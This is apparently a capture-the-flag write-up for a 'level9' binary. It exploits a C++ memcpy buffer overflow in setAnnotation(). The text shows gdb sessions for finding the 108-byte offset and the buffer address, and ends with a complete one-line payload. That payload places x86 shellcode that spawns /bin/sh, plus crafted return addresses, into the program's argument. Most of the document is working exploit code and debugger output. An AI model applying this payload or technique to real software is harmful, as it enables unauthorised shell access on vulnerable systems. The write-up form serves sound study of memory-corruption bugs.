In this binary, the code is in C++ and it contains a memcpy, which does not check the buffer's size: an overflow can be exploited. There is no call to system(), so we will have to use a shellcode instead.

The function setAnnotation() uses argv[1] to do its memcpy().

The offset can be found on gdb by executing a buffer overflow:

```shell
(gdb) run "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
Starting program: /home/user/level9/level9 "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) info registers eax
eax            0x41366441	1094083649

```

The offset is 108.

```
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    0x10(%esp),%eax
b *0x0804867c
Breakpoint 1 at 0x804867c
(gdb) run "FFFFFFFFF"
Starting program: /home/user/level9/level9 "FFFFFFFFF"

Breakpoint 1, 0x0804867c in main ()
(gdb) x $eax
0x804a00c:	0x46464646
```
We have the buffer address.

We still need one more information, where to inject the shellcode.
The function memcpy(this + 4,param_1,__n) starts at 0x804a00c, and + 4 is the buffer in the N class. As such, 0x804a00c + 0x04 = 0x804A010


Thus the payload will follow this pattern:
address to inject the shellcode + shellcode + offset + buffer address

```
./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "A" * 59 + "\x0c\xa0\x04\x08"')
```